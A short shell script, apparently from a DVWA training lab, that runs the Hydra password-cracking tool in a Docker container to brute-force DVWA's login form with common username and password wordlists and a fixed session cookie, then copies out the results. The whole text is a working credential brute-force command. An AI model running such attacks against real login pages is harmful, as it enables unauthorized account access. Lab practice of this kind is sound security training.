
#####
# 部署后，先登录dvwa，获取并替换session
#####
docker exec hydra hydra web-dvwa -L /var/data/hydra/top-usernames-shortlist.txt -P /var/data/hydra/2020-200_most_used_passwords.txt -vV http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=qdfab5bhkingom6c4kdubq4pg1; security=low" -o /var/data/out.txt
docker cp hydra:/var/data/out.txt .
